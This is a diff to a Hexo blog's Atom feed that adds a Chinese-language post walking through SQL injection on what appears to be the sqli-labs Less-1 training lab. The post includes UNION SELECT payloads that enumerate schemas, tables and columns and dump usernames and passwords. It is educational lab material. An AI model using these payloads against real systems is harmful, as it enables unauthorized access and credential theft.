@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-11-07T15:16:57.842Z</updated>
+  <updated>2021-11-14T14:43:22.081Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>less1</title>
+    <link href="http://example.com/2021/11/14/less1/"/>
+    <id>http://example.com/2021/11/14/less1/</id>
+    <published>2021-11-14T02:04:18.000Z</published>
+    <updated>2021-11-14T14:43:22.081Z</updated>
+    
+    <content type="html"><![CDATA[<p>#简介</p><p>less1</p><p>第一步（使用union注入）</p><p>注入/? id=1’进行判断字符注入类型，注入后报错，去掉’显示正常，可得less1为单字符型注入</p><p>报错看到limit0，1可知union查询的信息被占用了，可以将1改为-1来让出位置给需要的信息。</p><p>第二步</p><p>用order by 来查询列数直接order by 1后递增可查出order by 4不行，可知数据有3列。</p><p>第三步</p><p>用union select 1,2,3–+来查询显示位–+用来注释’</p><p>第四步</p><p>利用sql查询爆破</p><p>查询数据库名称</p><p><code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata %23</code></p><p>查询表名</p><p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23</code></p><p>查询字段</p><p><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p>查询内容</p><p><code>?id=-1&#39; union select 1,2,group_concat(username,0x3a,password) from users--+</code></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;#简介&lt;/p&gt;
+&lt;p&gt;less1&lt;/p&gt;
+&lt;p&gt;第一步（使用union注入）&lt;/p&gt;
+&lt;p&gt;注入/? id=1’进行判断字符注入类型，注入后报错，去掉’显示正常，可得less1为单字符型注入&lt;/p&gt;
+&lt;p&gt;报错看到limit0，1可知union查询的信息被占用了，可以将1改</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>css2</title>
